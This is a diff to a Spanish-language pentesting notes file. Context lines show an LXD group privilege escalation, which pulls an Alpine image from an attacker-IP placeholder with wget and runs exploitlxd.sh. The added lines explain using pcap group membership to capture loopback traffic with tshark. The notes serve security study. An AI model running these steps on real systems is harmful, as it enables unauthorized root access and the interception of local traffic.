@@ -114,6 +114,15 @@ wget http://<tu-ip-address>/alpine-v3.16-x86_64-20220817_1533.tar.gz
 chmod +x exploitlxd.sh
 ./exploitlxd.sh
 ```
+<b>Pcap</b><br>
+Si se estas asignado al grupo pcap puedes capturar el tráfico de la interfaz de red LoopBack y guardarlo en un archivo.cap. La interfaz de red lo (LoppBack) se utiliza para enviar datos al propio dispositivo.
+```
+tshark -i lo -w captura.cap -v
+
+# -i -> Especificar una interfaz de red.
+# -w -> Indicar el nombre del archivo con el cual se guardará la captura.
+# -v -> Verbose para ver más información acerca del tráfico de red.
+```
 <br><br>
 ## lsb_release -a (Linux Standard Base).
 Comando utilizado para mostrar toda la información acerca de la distribución de Linux (Sistema Operativo) que se está ejecutando, como su nombre de distibución, versión, codename y descripción.
